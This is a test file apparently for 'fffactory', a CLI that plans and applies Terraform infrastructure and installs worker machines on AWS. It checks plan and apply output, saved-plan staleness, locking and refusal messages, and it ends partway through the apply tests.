import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { stripVTControlCharacters } from "node:util";
import { managedTerraformPaths } from "../../src/application/managed-terraform";
import { planStoreDirectory } from "../../src/application/plan-store";
import { ansiStyle, type Style } from "../../src/cli/presentation/style";
import { run } from "../../src/cli/run";
import { newLockRecord } from "../../src/domain/factory-lock";
import type { RandomBytes } from "../../src/domain/initialization";
import type { Release } from "../../src/domain/instance";
import { SUPPORTED_TERRAFORM } from "../../src/domain/managed-terraform";
import { filesystemPlanStore } from "../../src/infrastructure/plan-store";
import { sha256Hex } from "../../src/infrastructure/release-tarball";
import { terraformProvisioner } from "../../src/infrastructure/terraform/provisioner";
import { terraformRunner } from "../../src/infrastructure/terraform/runner";
import { harness, TEST_NOW, zeroBytes } from "../support/cli-harness";
import {
  FAKE_ASSETS_SHA256,
  FAKE_CALLER,
  fakeAssetBundle,
  fakeCallerIdentity,
} from "../support/doctor-fakes";
import type { ControlPlane } from "../../src/application/control-plane";
import type { WorkflowQueue } from "../../src/application/workflow-queue";
import { fakeControlPlane, fakeWorkflowQueue } from "../support/fake-control-plane";
import {
  BUCKET,
  declaring,
  FACTORY,
  fleetView,
  requestingDispatch,
  WORKER_TAG,
  workerFleet,
} from "../support/factory-world";
import {
  fakeFactoryWorld,
  hostAddress,
  NETWORK,
  STATE_BUCKET_ADDRESS,
} from "../support/fake-provisioner";
import { newSavedBootstrapPlan } from "../../src/domain/plan";
import { fakePrompt } from "../support/fake-secrets";
import { type Behavior, fakeTerraform } from "../support/fake-terraform";
import { MemoryInstanceStore } from "../support/memory-instance-store";
import { MemoryLockStore, READY_BUCKET } from "../support/memory-lock-store";
import { MemoryPlanStore } from "../support/memory-plan-store";
import {
  appliedRecord,
  inspection,
  installableWorker,
  machine,
  peer,
  peers,
} from "../support/fake-workers";
import { hostApplyJson, pendingSteps, withStep } from "../../src/domain/installation";

const PATH = "/work/repo/.fffactory/factory.json";
/** What `fffactory COMMAND` prints first: its release, and the instance it acts on. */
const header = (command: string, instance = `${PATH} (nearest .fffactory/factory.json)`) => [
  `fffactory ${command} · release 0.3.0`,
  `Instance  ${instance}`,
];
const ASSETS = "/home/operator/.cache/fffactory/releases/0.3.0";
/** A section's rule line, 53 columns wide. */
const rule = (title: string) => `── ${title} ${"─".repeat(Math.max(2, 49 - title.length))}`;
const NEXT = rule("Next");
/** The plan section's rule and target, after the blank line that separates it. */
const PLAN = [
  "",
  rule("Plan"),
  "  Factory   Test factory (fff-abcd1234)",
  "  Account   123456789012 · eu-west-2",
  "  Release   0.3.0",
  "",
];
/** A first plan's infrastructure: the network and builder-1's machine. */
const CREATES = [
  "  Infrastructure   2 to add, 0 to change, 0 to destroy",
  `    + ${NETWORK}`,
  `    + ${hostAddress("builder-1")}`,
];
const B1 = "fff-abcd1234-builder-1";
/** Every later stage of builder-1, as the plan shows it. */
const STAGES = [
  "  Workers          one at a time",
  "    ~ builder-1   install release 0.3.0 and host configuration, then verify",
  "  Control plane    before worker activation",
  "    ~ builder-1   paseo-package, service-definition, listen-address, password",
  "  Repositories     one worker at a time",
  "    ~ builder-1   reconcile 0 placed repositories as factory; preserve and report unmanaged checkouts",
  "  Dispatch         after every readiness gate",
  "    ~ builder-1   remove the factory dispatch schedule if it exists",
  "  Verification     end to end: observe each worker's release, repositories, Paseo and actual dispatch schedule",
];
/** What `fffactory plan` prints after the plan it saved as aaaaaaaa. */
const SAVED = [
  "",
  "Saved as plan aaaaaaaa, until 2026-09-30T13:00:00.000Z.",
  "",
  NEXT,
  "  Apply exactly this plan:",
  "    $ fffactory apply --plan-id aaaaaaaa",
];
/** Backend bootstrap's plan section, after the blank line that separates it. */
const BOOTSTRAP_PLAN = [
  "",
  rule("Plan: backend bootstrap"),
  ...PLAN.slice(2),
  `  State bucket     ${BUCKET}, which does not exist yet`,
  "  Infrastructure   1 to add, 0 to change, 0 to destroy",
  `    + ${STATE_BUCKET_ADDRESS}`,
];
/** The Applying section, once Terraform applies the plan's infrastructure changes. */
const TERRAFORM = [
  "",
  rule("Applying"),
  "  Infrastructure   applying with Terraform (its output is not shown; can take several minutes)",
];
/** What apply prints while it installs builder-1, the labels as wide as Terraform's row. */
const INSTALLED = [
  "  builder-1        uploading 0.0 MiB",
  "  builder-1        installing and verifying (can take many minutes)",
];
const RESULT = rule("Result");
const APPLIED = "    Infrastructure     applied: matches factory.json";
const UNCHANGED = "    Infrastructure     no changes";
const ENROLLMENT_PENDING = "  ! builder-1          installed and verified · enrollment pending (3)";
const RECORD_LINE = /^ {4}Operation record {3}s3:\/\/fff-abcd1234-state\/.+\.json$/;
/** The Next block of builder-1's enrollment, after a blank line. */
const ENROLL = [
  "",
  rule("Next: enroll 3 accounts on builder-1"),
  "  Log in as factory (tailnet SSH policy must allow it):",
  `    $ tailscale ssh factory@${B1}`,
  "",
  "  1. GitHub",
  "     $ gh auth login --hostname github.com --git-protocol https --web",
  "     $ gh auth status --hostname github.com --active",
  "  2. OpenAI Codex",
  "     $ codex login --device-auth",
  "     $ codex login status",
  "  3. Claude Code",
  "     $ claude auth login",
  "     $ claude auth status",
  "",
  "  Return to your workstation:",
  "    $ exit",
  "  Refresh enrollment verification, reviewing the new plan:",
  "    $ fffactory apply",
  "  Then confirm:",
  "    $ fffactory status",
  "  Paseo clients: enrollment is checked from each client, not the worker",
];
/** What an interrupt that keeps the lock asks, after a blank line. */
const BREAK_THEN_RERUN = [
  "",
  NEXT,
  "  Once fffactory has exited, break the lock:",
  "    $ fffactory lock break",
  "  Then rerun:",
  "    $ fffactory apply",
];
/** How a failure that may have changed something converges, after a blank line. */
const CONVERGE = [
  "",
  NEXT,
  "  Rerun: it plans again from what exists now and converges what remains:",
  "    $ fffactory apply",
];

/** The plan's row for a factory that declares no worker. */
const NO_WORKERS =
  "  Workers          none declared. Declare a host in factory.json's hosts, then create it with `fffactory apply`.";

function text(hosts: string[], overrides: object = {}): string {
  return `${JSON.stringify({ ...declaring(...hosts), ...overrides }, null, 2)}\n`;
}

/**
 * The CLI over one factory: factory.json declaring `declared`, its state bucket (unless
 * `bucket` is false) and a Terraform world with `hosts` provisioned. Answers the prompt with
 * `answers` at a terminal when `interactive`.
 */
function cli(
  options: {
    declared?: string[];
    hosts?: string[];
    bucket?: boolean;
    interactive?: boolean;
    answers?: (string | undefined)[];
    document?: string;
    identity?: ReturnType<typeof fakeCallerIdentity>;
    fleet?: ReturnType<typeof workerFleet>;
    controlPlane?: ControlPlane;
    workflowQueue?: WorkflowQueue;
    randomBytes?: RandomBytes;
    styles?: { out?: Style; err?: Style };
  } = {},
) {
  const store = new MemoryInstanceStore({
    [PATH]: options.document ?? text(options.declared ?? ["builder-1"]),
  });
  const lockStore = new MemoryLockStore(options.bucket === false ? [] : [BUCKET]);
  const terraform = fakeFactoryWorld({ store: lockStore, bucket: BUCKET, hosts: options.hosts });
  if ((options.hosts ?? []).length > 0) lockStore.states.set(BUCKET, "revision-0");
  const planStore = new MemoryPlanStore();
  const prompt = fakePrompt({
    interactive: options.interactive ?? false,
    answers: options.answers,
  });
  const assets = fakeAssetBundle();
  const identity = options.identity ?? fakeCallerIdentity();
  const fleet = options.fleet ?? workerFleet();
  const signal = { interrupted: false };
  const { randomBytes = zeroBytes } = options;
  const context = harness(
    store,
    {},
    {
      lockStore,
      provisioner: terraform.provisioner,
      planStore,
      prompt: prompt.prompt,
      assets: assets.bundle,
      identity: identity.identity,
      interrupted: () => signal.interrupted,
      machines: fleet.deps.machines,
      tailnet: fleet.deps.peers,
      transport: fleet.deps.transport,
      sleep: fleet.deps.sleep,
      ...(options.controlPlane === undefined ? {} : { controlPlane: options.controlPlane }),
      ...(options.workflowQueue === undefined ? {} : { workflowQueue: options.workflowQueue }),
      randomBytes,
      styles: options.styles,
    },
  );
  return {
    ...context,
    store,
    lockStore,
    terraform,
    planStore,
    prompt,
    assets,
    identity,
    signal,
    fleet,
  };
}

describe("fffactory plan (plan-apply §Plan)", () => {
  test("shows the target and the infrastructure changes, and saves the plan", async () => {
    const { context, out, err, planStore, terraform, assets, store } = cli();
    expect(await run(["plan"], context)).toBe(0);
    expect(err).toEqual([]);
    expect(out).toEqual([...header("plan"), ...PLAN, ...CREATES, ...STAGES, ...SAVED]);
    expect(planStore.saved.get(`${FACTORY}/aaaaaaaa`)).toMatchObject({
      instance_path: PATH,
      configuration_sha256: sha256Hex(new TextEncoder().encode(store.files[PATH])),
      release: "0.3.0",
      assets_sha256: FAKE_ASSETS_SHA256,
      account_id: "123456789012",
    });
    expect(assets.materialized).toEqual([ASSETS]);
    expect(terraform.calls[0]?.request.configuration).toEqual({
      directory: `${ASSETS}/terraform`,
      root: "factory",
    });
  });

  test("the Next block repeats the instance and profile the plan was made with, quoted", async () => {
    const { context, out, store } = cli();
    const path = "/elsewhere/it's my factory.json";
    store.files[path] = store.files[PATH] as string;
    const args = ["plan", "--instance", path, "--profile", "o'brien factory"];
    expect(await run(args, context)).toBe(0);
    expect(out.slice(0, 2)).toEqual(header("plan", `${path} (--instance)`));
    expect(out.slice(-3)).toEqual([
      NEXT,
      "  Apply exactly this plan:",
      "    $ fffactory apply --plan-id aaaaaaaa --instance '/elsewhere/it'\\''s my factory.json' " +
        "--profile 'o'\\''brien factory'",
    ]);
  });

  test("a factory.json under the home directory is shown from ~", async () => {
    const { context, out, store } = cli();
    const path = "/home/operator/test-factory/.fffactory/factory.json";
    store.files[path] = store.files[PATH] as string;
    expect(await run(["plan", "--instance", path], context)).toBe(0);
    expect(out.slice(0, 2)).toEqual(
      header("plan", "~/test-factory/.fffactory/factory.json (--instance)"),
    );
    expect(out.at(-1)).toBe(`    $ fffactory apply --plan-id aaaaaaaa --instance ${path}`);
  });

  test("a factory placing a repository and requesting dispatch shows each in its stage", async () => {
    const { context, out } = cli({
      hosts: ["builder-1"],
      document: `${JSON.stringify(requestingDispatch(), null, 2)}\n`,
    });
    expect(await run(["plan"], context)).toBe(0);
    const stages = out.indexOf("  Control plane    before worker activation");
    expect(out.slice(stages, -SAVED.length)).toEqual([
      "  Control plane    before worker activation",
      "    ~ builder-1   paseo-package, service-definition, listen-address, password",
      "  Repositories     one worker at a time",
      "    ~ builder-1   reconcile 1 placed repository as factory; preserve and report unmanaged checkouts",
      "  Dispatch         after every readiness gate",
      "    ~ builder-1   install the dispatcher and skill, then reconcile */15 * * * * UTC with claude/configured-model, mode default, cwd /home/factory",
      "  Verification     end to end: observe each worker's release, repositories, Paseo and actual dispatch schedule",
    ]);
  });

  test("its human output is colored only on a stream that is (cli-output §Color)", async () => {
    const { context, out, err } = cli({ styles: { out: ansiStyle } });
    expect(await run(["plan"], context)).toBe(0);
    expect(err).toEqual([]);
    expect(out[0]).toBe(`${ansiStyle.heading("fffactory plan")} · release 0.3.0`);
    expect(out).toContain(`    ${ansiStyle.command("fffactory apply --plan-id aaaaaaaa")}`);
    expect(out.map((line) => stripVTControlCharacters(line))).toEqual([
      ...header("plan"),
      ...PLAN,
      ...CREATES,
      ...STAGES,
      ...SAVED,
    ]);
    const refused = cli({ styles: { out: ansiStyle }, hosts: ["builder-1", "builder-2"] });
    expect(await run(["plan"], refused.context)).toBe(1);
    expect(refused.err.join("\n")).not.toContain("\x1b");
    expect(refused.err[1]).toStartWith("✖ Refusing: this change needs host removal");
  });

  test("without infrastructure changes, the plan installs the workers and is saved", async () => {
    const { context, out, planStore } = cli({ hosts: ["builder-1"] });
    expect(await run(["plan"], context)).toBe(0);
    expect(out).toEqual([
      ...header("plan"),
      ...PLAN,
      "  Infrastructure   no changes",
      ...STAGES,
      ...SAVED,
    ]);
    expect(planStore.saved.size).toBe(1);
  });

  test("an empty factory plans only its shared infrastructure, saying no worker is declared", async () => {
    const { context, out, err, planStore } = cli({ declared: [] });
    expect(await run(["plan"], context)).toBe(0);
    expect(err).toEqual([]);
    expect(out).toEqual([
      ...header("plan"),
      ...PLAN,
      "  Infrastructure   1 to add, 0 to change, 0 to destroy",
      `    + ${NETWORK}`,
      NO_WORKERS,
      ...SAVED,
    ]);
    expect(planStore.saved.size).toBe(1);
  });

  test("before the first apply, saves backend bootstrap's plan to apply by its ID", async () => {
    const { context, out, err, lockStore, planStore, prompt } = cli({ bucket: false });
    expect(await run(["plan"], context)).toBe(0);
    expect(err).toEqual([]);
    expect(out).toEqual([
      ...header("plan"),
      ...BOOTSTRAP_PLAN,
      "",
      "Saved as plan aaaaaaaa, until 2026-09-30T13:00:00.000Z.",
      "The factory itself is planned once the state bucket exists.",
      "",
      NEXT,
      "  Apply exactly this plan:",
      "    $ fffactory apply --plan-id aaaaaaaa",
      "  Then plan the factory:",
      "    $ fffactory plan",
    ]);
    expect(planStore.saved.get(`${FACTORY}/aaaaaaaa`)).toMatchObject({
      kind: "bootstrap",
      instance_path: PATH,
      account_id: "123456789012",
    });
    expect(prompt.asked).toEqual([]);
    expect(lockStore.buckets.size).toBe(0);
    expect(lockStore.locks.size).toBe(0);
  });

  test("the bootstrap plan's apply command repeats the instance and profile", async () => {
    const { context, out, store } = cli({ bucket: false });
    store.files["/elsewhere/my factory.json"] = store.files[PATH] as string;
    const args = ["plan", "--instance", "/elsewhere/my factory.json", "--profile", "factory"];
    expect(await run(args, context)).toBe(0);
    expect(out.slice(-4)).toEqual([
      "  Apply exactly this plan:",
      "    $ fffactory apply --plan-id aaaaaaaa --instance '/elsewhere/my factory.json' --profile factory",
      "  Then plan the factory:",
      "    $ fffactory plan --instance '/elsewhere/my factory.json' --profile factory",
    ]);
  });

  test("a bootstrap plan Terraform shows doing more than create is refused and saves nothing", async () => {
    const { context, err, terraform, planStore } = cli({ bucket: false });
    terraform.world.shown = {
      resource_changes: [
        {
          address: STATE_BUCKET_ADDRESS,
          type: "aws_s3_bucket",
          change: { actions: ["update"] },
        },
      ],
    };
    expect(await run(["plan"], context)).toBe(1);
    expect(err.join("\n")).toContain(`${STATE_BUCKET_ADDRESS} (update)`);
    expect(planStore.saved.size).toBe(0);
    expect(planStore.directories.size).toBe(0);
  });

  test("refuses another account before anything else reaches AWS", async () => {
    const other = fakeCallerIdentity({
      kind: "caller",
      caller: { ...FAKE_CALLER, account: "210987654321" },
    });
    const { context, err, terraform, lockStore, assets } = cli({ identity: other });
    expect(await run(["plan"], context)).toBe(1);
    expect(err[0]).toStartWith("Refusing to plan: ");
    expect(terraform.calls).toEqual([]);
    expect(lockStore.calls).toEqual([]);
    expect(assets.materialized).toEqual([]);
  });

  test("the CLI/pin match guard refuses a factory pinned to another release", async () => {
    const { context, err, terraform } = cli({
      document: text(["builder-1"], { release: "0.2.0" }),
    });
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing to plan: factory.json pins another fffactory release than this one, 0.3.0: " +
        "only the pinned release may plan or change this factory. Install the release " +
        "factory.json pins, or move the pin to 0.3.0 with `fffactory upgrade`.",
    ]);
    expect(terraform.calls).toEqual([]);
  });

  test("an incomplete factory.json is refused with each missing field", async () => {
    const { context, err } = cli({ document: text(["builder-1"], { network: undefined }) });
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing to plan: factory.json is not ready:",
      "  network.vpc_cidr: is required to plan",
      "  network.public_subnet_cidr: is required to plan",
      "  network.availability_zone: is required to plan",
    ]);
  });

  test("D11: removing a provisioned host key by hand is refused, naming `fffactory worker terminate`", async () => {
    const { context, err, planStore } = cli({ hosts: ["builder-1", "builder-2"] });
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing: this change needs host removal, which only `fffactory worker terminate KEY` " +
        "does (D11):",
      '  hosts: host key "builder-2" is provisioned but no longer declared: host keys cannot ' +
        "be renamed, and only `fffactory worker terminate builder-2` removes a host. Restore " +
        "it, and declare any new host under a new key beside it",
      "",
      "Nothing was applied.",
      "",
      NEXT,
      "  Declare every provisioned host key in factory.json again, then remove a host with " +
        "`fffactory worker terminate KEY`.",
    ]);
    expect(planStore.saved.size).toBe(0);
  });

  test("D11: a plan that replaces a host is refused, naming host replacement", async () => {
    const { context, err, terraform } = cli({ hosts: ["builder-1"] });
    terraform.world.replace.add("builder-1");
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing: this change needs host replacement, which fffactory does " +
        "not have yet (D11; it arrives in milestone M3):",
      `  ${hostAddress("builder-1")} would be replaced`,
      "",
      "Nothing was applied.",
      "",
      NEXT,
      "  Change factory.json so the plan keeps every host machine, then plan again.",
    ]);
  });

  test.each(["plan", "apply"])(
    "D11: %s repeats the selected instance and profile in every removal command",
    async (action) => {
      const { context, err, store, planStore } = cli({
        hosts: ["builder-1", "builder-2"],
        interactive: true,
      });
      const path = "/elsewhere/it's my factory.json";
      const profile = "production's account";
      store.files[path] = store.files[PATH] as string;
      expect(await run([action, "--instance", path, "--profile", profile], context)).toBe(1);
      const selection =
        " --instance '/elsewhere/it'\\''s my factory.json' --profile 'production'\\''s account'";
      const command = `fffactory worker terminate KEY${selection}`;
      expect(err).toEqual([
        "",
        `✖ Refusing: this change needs host removal, which only \`${command}\` does (D11):`,
        '  hosts: host key "builder-2" is provisioned but no longer declared: host keys cannot ' +
          `be renamed, and only \`fffactory worker terminate builder-2${selection}\` removes a host. Restore ` +
          "it, and declare any new host under a new key beside it",
        "",
        "Nothing was applied.",
        "",
        NEXT,
        "  Declare every provisioned host key in factory.json again, then remove a host with " +
          `\`${command}\`.`,
      ]);
      expect(planStore.saved.size).toBe(0);
    },
  );

  test("a stopped worker's install is shown skipped (plan-apply §Stopped workers)", async () => {
    const fleet = workerFleet(["builder-1"]);
    fleet.machines.inventory = { kind: "machines", machines: [machine("builder-1", "stopped")] };
    const { context, out } = cli({ hosts: ["builder-1"], fleet });
    expect(await run(["plan"], context)).toBe(0);
    expect(out).toEqual([
      ...header("plan"),
      ...PLAN,
      "  Infrastructure   no changes",
      "  Workers          one at a time",
      "    builder-1   skipped: stopped; start it with `fffactory worker start builder-1`, then " +
        "apply again to install it",
      "  Control plane    before worker activation",
      "    builder-1   skipped: stopped",
      "  Repositories     one worker at a time",
      "    builder-1   skipped: stopped",
      "  Dispatch         after every readiness gate",
      "    builder-1   skipped: stopped",
      "  Verification     end to end: observe each worker's release, repositories, Paseo and actual dispatch schedule",
      ...SAVED,
    ]);
  });

  test("an instance type change on a stopped worker is refused, naming the start command", async () => {
    const fleet = workerFleet(["builder-1"]);
    fleet.machines.inventory = { kind: "machines", machines: [machine("builder-1", "stopped")] };
    const { context, err, terraform, planStore } = cli({ hosts: ["builder-1"], fleet });
    terraform.world.resize.add("builder-1");
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing to plan: the plan changes the instance type of a stopped worker, and " +
        "Terraform starts a stopped instance to change its type:",
      `  builder-1   ${hostAddress("builder-1")} would be updated in place`,
      "",
      "Nothing was applied.",
      "",
      NEXT,
      "  Start it first:",
      "    $ fffactory worker start builder-1",
      "  Then plan again:",
      "    $ fffactory plan",
    ]);
    expect(planStore.saved.size).toBe(0);
  });

  test("with the EC2 inventory unreadable, an instance type change is refused", async () => {
    const fleet = workerFleet(["builder-1"]);
    fleet.machines.inventory = { kind: "unavailable", reason: "EC2 DescribeInstances failed: x" };
    const { context, err, terraform, planStore } = cli({ hosts: ["builder-1"], fleet });
    terraform.world.resize.add("builder-1");
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing to plan: the plan changes the instance type of a worker the EC2 inventory " +
        "could not be read to check is not stopped, and Terraform starts a stopped instance " +
        "to change its type:",
      `  builder-1   ${hostAddress("builder-1")} would be updated in place`,
      "",
      "Nothing was applied.",
      "",
      NEXT,
      "  Plan again once the EC2 inventory can be read:",
      "    $ fffactory plan",
    ]);
    expect(planStore.saved.size).toBe(0);
  });

  test("a state bucket bootstrap did not finish is refused with how to complete it", async () => {
    const { context, err, lockStore } = cli();
    lockStore.readiness.set(BUCKET, { ...READY_BUCKET, encrypted: false });
    expect(await run(["plan"], context)).toBe(1);
    expect(err.slice(0, 7)).toEqual([
      "",
      `✖ The state bucket ${BUCKET} exists, but backend bootstrap did not finish it. It lacks:`,
      "  default encryption",
      "",
      NEXT,
      "  If another first apply is still bootstrapping it, wait for that to finish, then retry.",
      "",
    ]);
  });

  test("a Terraform plan fffactory cannot read is refused", async () => {
    const { context, err, terraform } = cli();
    terraform.world.shown = { resource_changes: "garbled" };
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing to plan: Terraform's plan is not one fffactory can apply:",
      "  Terraform's plan could not be read",
    ]);
  });

  test("while the factory is locked, shows the holder", async () => {
    const { context, err, lockStore } = cli({ hosts: ["builder-1"] });
    lockStore.hold(
      BUCKET,
      newLockRecord({
        factoryId: FACTORY,
        operation: "apply",
        holder: { principal: "arn:aws:iam::123456789012:user/other", host: "desk" },
        now: new Date(TEST_NOW.getTime() - 5 * 60_000),
        release: "0.3.0" as Release,
        randomBytes: (count) => new Uint8Array(count).fill(9),
      }),
    );
    expect(await run(["plan", "--profile", "factory"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ The factory is locked by another operation:",
      "  Lock jjjjjjjj: apply by arn:aws:iam::123456789012:user/other on desk",
      "  Acquired 2026-09-30T11:55:00.000Z (5 min ago) by fffactory 0.3.0",
      "",
      NEXT,
      "  Wait for it to finish. If its holder is no longer running, break the lock:",
      "    $ fffactory lock break --profile factory",
    ]);
  });

  test("an empty --profile is refused", async () => {
    const { context, err } = cli();
    expect(await run(["plan", "--profile", ""], context)).toBe(1);
    expect(err).toEqual(["fffactory plan: --profile needs a profile name"]);
  });
});

describe("fffactory apply (plan-apply §Apply)", () => {
  test("at a terminal, shows the plan, applies it once yes is typed, and releases the lock", async () => {
    const { context, out, err, prompt, lockStore, terraform } = cli({
      interactive: true,
      answers: ["yes"],
      controlPlane: fakeControlPlane("healthy", { kind: "idle" }).controlPlane,
      workflowQueue: fakeWorkflowQueue().queue,
    });
    lockStore.buckets.add(BUCKET);
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([]);
    const key = `${FACTORY}-operations/2026-09-30T12:00:00.000Z-aaaaaaaa.json`;
    expect(out).toEqual([
      ...header("apply"),
      ...PLAN,
      ...CREATES,
      ...STAGES,
      "",
      ...TERRAFORM,
      ...INSTALLED,
      "",
      RESULT,
      APPLIED,
      ENROLLMENT_PENDING,
      "    ✔ Control plane   applied",
      "    ✔ Repositories    synchronized",
      "      Dispatch        not requested",
      "  ! Verification       The factory is ready: every worker is verified end to end · enrollment pending on 1 worker",
      `    Operation record   s3://${BUCKET}/${key}`,
      ...ENROLL,
    ]);
    expect(prompt.asked).toEqual(['Apply this plan? Only "yes" applies it: ']);
    expect(terraform.world.hosts.has("builder-1")).toBe(true);
    expect(lockStore.locks.size).toBe(0);
    expect(lockStore.operations.get(key)?.status).toBe("succeeded");
  });

  test.each([["no"], ["y"], [undefined]])(
    "any answer but yes (%p) applies nothing",
    async (answer) => {
      const { context, err, terraform, lockStore } = cli({ interactive: true, answers: [answer] });
      expect(await run(["apply"], context)).toBe(1);
      expect(err).toEqual(["", "✖ Not approved: nothing was applied"]);
      expect(terraform.calls.some(({ call }) => call === "applyPlan")).toBe(false);
      expect(lockStore.locks.size).toBe(0);
    },
  );

  test("without a terminal or a plan ID, refuses before reaching AWS", async () => {
    const { context, err, identity } = cli();
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Applying needs your approval of the plan: rerun at a terminal, or save a plan with " +
        "`fffactory plan` and apply exactly it with --plan-id ID.",
    ]);
    expect(identity.requests).toEqual([]);
  });

  test("a malformed plan ID is refused", async () => {
    const { context, err } = cli();
    expect(await run(["apply", "--plan-id", "../x"], context)).toBe(1);
    expect(err).toEqual([
      "fffactory apply: --plan-id takes the 8-character plan ID `fffactory plan` printed",
    ]);
  });

  test("applies exactly a saved plan, approved by naming it, without asking", async () => {
    const { context, out, prompt, terraform } = cli();
    expect(await run(["plan"], context)).toBe(0);
    out.length = 0;
    terraform.calls.length = 0;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(0);
    expect(out).toEqual([
      ...header("apply"),
      ...PLAN,
      ...CREATES,
      ...STAGES,
      "",
      "Applying saved plan aaaaaaaa, approved by naming its ID.",
      ...TERRAFORM,
      ...INSTALLED,
      "",
      RESULT,
      APPLIED,
      ENROLLMENT_PENDING,
      "    ✔ Repositories    synchronized",
      expect.stringMatching(RECORD_LINE),
      ...ENROLL,
    ]);
    expect(prompt.asked).toEqual([]);
    expect(terraform.calls.map(({ call }) => call)).toEqual(["showPlan", "applyPlan"]);
  });

  test("applying a plan after factory.json changes is refused", async () => {
    const { context, err, store, terraform, lockStore } = cli();
    expect(await run(["plan"], context)).toBe(0);
    store.files[PATH] = text(["builder-1", "builder-2"]);
    terraform.calls.length = 0;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ Refusing to apply plan aaaaaaaa: it is no longer the plan to apply:",
      "  factory.json changed after it was planned",
      "",
      "Nothing was applied.",
      "",
      NEXT,
      "  Review a new plan:",
      "    $ fffactory plan",
    ]);
    expect(terraform.calls).toEqual([]);
    expect(lockStore.locks.size).toBe(0);
  });

  test("a refusal's Next block repeats the instance and profile apply was given", async () => {
    const { context, err, store } = cli();
    const path = "/elsewhere/my factory.json";
    store.files[path] = store.files[PATH] as string;
    const args = ["apply", "--instance", path, "--profile", "factory", "--plan-id", "zzzzzzzz"];
    expect(await run(args, context)).toBe(1);
    expect(err.at(-1)).toBe(
      "    $ fffactory plan --instance '/elsewhere/my factory.json' --profile factory",
    );
  });

  test("even a formatting change to factory.json makes a saved plan stale", async () => {
    const { context, err, store } = cli();
    expect(await run(["plan"], context)).toBe(0);
    store.files[PATH] = `${store.files[PATH]}\n`;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(1);
    expect(err).toContain("  factory.json changed after it was planned");
  });

  test("a plan ID with no saved plan, or a damaged one, is refused", async () => {
    const { context, err, planStore } = cli();
    expect(await run(["apply", "--plan-id", "zzzzzzzz"], context)).toBe(1);
    expect(err).toEqual([
      "",
      "✖ There is no saved plan zzzzzzzz for this factory here: it expired, was applied, or " +
        "was saved elsewhere",
      "",
      NEXT,
      "  Review a new plan:",
      "    $ fffactory plan",
    ]);
    expect(await run(["plan"], context)).toBe(0);
    planStore.damage(FACTORY, "aaaaaaaa");
    err.length = 0;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(1);
    expect(err[1]).toStartWith("✖ Saved plan aaaaaaaa cannot be applied");
    expect(err.at(-1)).toBe("    $ fffactory plan");
  });

  test("a failed Terraform apply says what may have changed and how to converge", async () => {
    const { context, out, err, terraform } = cli({ interactive: true, answers: ["yes"] });
    terraform.world.failNext = "applyPlan";
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ✖ Applying failed: `terraform apply` exited with status 1",
      "    Terraform may have changed some of the infrastructure before it stopped.",
      ...CONVERGE,
    ]);
    // The record's location stays on standard output, between the failure and its Next block.
    expect(out.slice(-2)).toEqual(["", expect.stringMatching(/^ {2}Operation record {3}s3:\/\//)]);
  });

  test("a failed Terraform plan says nothing was applied", async () => {
    const { context, err, terraform } = cli({ interactive: true, answers: ["yes"] });
    terraform.world.failNext = "plan";
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ✖ Planning failed: `terraform plan` exited with status 1",
      "    Nothing was applied.",
    ]);
  });

  test("with no infrastructure changes, installs the workers once yes is typed", async () => {
    const { context, out, prompt, terraform } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(out).toContain(UNCHANGED);
    expect(out).not.toContain(TERRAFORM[2]);
    expect(out).toContain(ENROLLMENT_PENDING);
    expect(prompt.asked).toHaveLength(1);
    expect(terraform.calls.some(({ call }) => call === "applyPlan")).toBe(false);
  });

  test("an empty factory applies its shared infrastructure, installs nothing and exits 0", async () => {
    const queue = fakeWorkflowQueue();
    const { context, out, err, terraform, lockStore, fleet } = cli({
      declared: [],
      interactive: true,
      answers: ["yes"],
      controlPlane: fakeControlPlane("healthy", { kind: "idle" }).controlPlane,
      workflowQueue: queue.queue,
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([]);
    expect(out.slice(out.indexOf(RESULT))).toEqual([
      RESULT,
      APPLIED,
      "    Workers            none declared. Declare a host in factory.json's hosts, then " +
        "create it with `fffactory apply`.",
      "  ✔ Verification       The factory is ready: it declares no workers",
      expect.stringMatching(RECORD_LINE),
    ]);
    expect(terraform.world.network).toBe(true);
    expect(fleet.transport.calls).toEqual([]);
    expect(lockStore.locks.size).toBe(0);
    // Rerun: nothing to change, nothing to install, still ready.
    expect(
      await run(["apply"], {
        ...context,
        prompt: fakePrompt({ interactive: true, answers: ["yes"] }).prompt,
      }),
    ).toBe(0);
    expect(out).toContain(UNCHANGED);
  });

  test("a skipped worker exits 2 with its next action", async () => {
    const { context, out } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet([]),
    });
    expect(await run(["apply"], context)).toBe(2);
    expect(out).toContain(
      `  ↷ builder-1          skipped · No Tailscale device named ${B1} is visible from this machine`,
    );
    const next = out.slice(out.indexOf(NEXT));
    expect(next[1]).toStartWith("  builder-1: ");
    expect(next[1]).toEndWith(", then rerun `fffactory apply`.");
  });

